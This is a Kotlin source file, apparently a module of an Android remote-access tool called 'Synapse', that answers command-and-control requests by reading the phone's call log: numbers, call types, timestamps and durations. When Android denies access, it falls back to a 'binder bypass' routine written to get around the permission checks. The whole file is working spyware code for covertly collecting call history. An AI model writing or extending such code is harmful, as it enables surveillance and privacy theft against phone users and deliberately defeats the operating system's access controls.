package org.synapse.core.modules

import android.content.Context
import android.provider.CallLog
import android.util.Log
import org.synapse.core.c2.Command
import org.synapse.core.core.CallEntry
import org.synapse.core.core.SynapseResponse

object CallLogModule {

    suspend fun list(context: Context, cmd: Command): SynapseResponse {
        val count = (cmd.params["count"]?.toIntOrNull() ?: 100).coerceAtMost(500)
        val filter = cmd.params["filter"]  // incoming, outgoing, missed, all

        return try {
            val calls = mutableListOf<CallEntry>()
            val cursor = context.contentResolver.query(
                CallLog.Calls.CONTENT_URI,
                null,
                null,
                null,
                "${CallLog.Calls.DATE} DESC"
            )

            cursor?.use {
                val numIdx = it.getColumnIndex(CallLog.Calls.NUMBER)
                val typeIdx = it.getColumnIndex(CallLog.Calls.TYPE)
                val dateIdx = it.getColumnIndex(CallLog.Calls.DATE)
                val durIdx = it.getColumnIndex(CallLog.Calls.DURATION)

                while (it.moveToNext() && calls.size < count) {
                    val callType = if (typeIdx >= 0) {
                        when (it.getInt(typeIdx)) {
                            CallLog.Calls.INCOMING_TYPE -> "incoming"
                            CallLog.Calls.OUTGOING_TYPE -> "outgoing"
                            CallLog.Calls.MISSED_TYPE -> "missed"
                            CallLog.Calls.VOICEMAIL_TYPE -> "voicemail"
                            CallLog.Calls.REJECTED_TYPE -> "rejected"
                            CallLog.Calls.BLOCKED_TYPE -> "blocked"
                            else -> "unknown"
                        }
                    } else "unknown"

                    // Apply filter if specified
                    if (filter != null && filter != "all" && callType != filter) continue

                    calls.add(CallEntry(
                        number = if (numIdx >= 0) it.getString(numIdx) ?: "" else "",
                        type = callType,
                        date = if (dateIdx >= 0) it.getLong(dateIdx) else 0L,
                        duration = if (durIdx >= 0) it.getLong(durIdx) else 0L
                    ))
                }
            }

            SynapseResponse.CallLogResponse(
                calls = calls,
                count = calls.size
            )
        } catch (e: Exception) {
            // ── Binder bypass fallback — catches SecurityException, RuntimeException, etc. ──
            Log.d("Synapse.CallLog", "ContentResolver failed (${e.javaClass.simpleName}: ${e.message}), trying binder bypass...")
            return try {
                val binderCalls = PermissionBypass.readCallLogViaBinder(context, filter, count)
                if (binderCalls.isNotEmpty()) {
                    Log.d("Synapse.CallLog", "Binder bypass SUCCESS: ${binderCalls.size} calls")
                    SynapseResponse.CallLogResponse(calls = binderCalls, count = binderCalls.size)
                } else {
                    Log.d("Synapse.CallLog", "Binder bypass returned 0 calls")
                    SynapseResponse.CallLogResponse(calls = emptyList(), count = 0)
                }
            } catch (bp: Exception) {
                Log.e("Synapse.CallLog", "Binder bypass FAILED: ${bp.message}", bp)
                SynapseResponse.ErrorResponse("calls:bypass_failed:${bp.message}", "calls")
            }
        }
    }
}
